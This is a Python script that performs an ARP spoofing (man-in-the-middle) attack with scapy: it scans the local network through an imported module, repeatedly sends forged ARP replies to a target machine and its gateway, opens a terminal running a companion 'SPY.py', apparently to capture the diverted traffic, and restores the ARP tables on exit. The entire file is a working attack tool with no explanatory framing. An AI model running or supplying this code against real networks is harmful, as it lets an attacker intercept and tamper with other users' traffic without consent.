from MAC_HUNT import local_prep
from scapy.all import ARP, Ether, sendp
import time
import subprocess
import platform
import sys



class spoof():
    def __init__ (self):
        pass
        
    def lie(self,target_ip,target_mac,gateway_ip,gateway_mac):
        
        ether_to_target=Ether(dst=target_mac)
        packet_to_target_arp=ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        sendp(ether_to_target/packet_to_target_arp, verbose=False)
        
        
        ether_to_router=Ether(dst=gateway_mac)
        packet_to_router_arp=ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
        sendp(ether_to_router/packet_to_router_arp, verbose=False)
    
    def truth(self,target_ip,target_mac,gateway_ip,gateway_mac):
        ether_to_target=Ether(dst=target_mac)
        packet_to_target_arp=ARP(op=2, pdst=target_ip, hwdst= target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
        sendp(ether_to_target/packet_to_target_arp, verbose=False)
        
        
        ether_to_router=Ether(dst=gateway_mac)
        packet_to_router_arp=ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
        sendp(ether_to_router/packet_to_router_arp, verbose=False, count=5)
    

class local_os():
    def __init__ (self):
        pass
    
    def open_terminal(self):
        if platform.system() == "windows":
            subprocess.Popen(['start' , 'cmd' , '/k' , 'python SPY.py'], shell=True)
        elif platform.system() == "linux":
            subprocess.Popen(['gnome-terminal', '--', 'sudo', 'python3', 'SPY.py']) 
        elif platform.system() == "darwin":
            subprocess.Popen(['open', '-a', 'Terminal.app', '--args', 'python3', 'SPY.py'])          
            
class main():
    def __init__ (self):
        self.spoof=spoof()    
        self.local_os=local_os()
        self.target_ip,self.target_mac,self.gateway_ip,self.gateway_mac=local_prep().scan_network()
        
        
    def run(self):
        if self.target_ip is None or self.gateway_ip is None:
            print("[-] Could not find target or gateway IP. Exiting.")
            sys.exit(1)
        else:    
            print("[+] Hijacking...\n[#]Spawning Spy Terminal...\n[!] Press Ctrl+C to Stop and Restore ARP Tables")
            self.spoof.lie(self.target_ip,self.target_mac,self.gateway_ip,self.gateway_mac)
            self.local_os.open_terminal()
            
            try:
                while True:
                    self.spoof.lie(self.target_ip,self.target_mac,self.gateway_ip,self.gateway_mac)
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n[-] Attack Stopped. Restoring Target's ARP Table...")
                self.spoof.truth(self.target_ip,self.target_mac,self.gateway_ip,self.gateway_mac)
                print("ARP Table Restored. Exiting.")        
                      
            
            
if __name__=="__main__":
    main().run()                  
            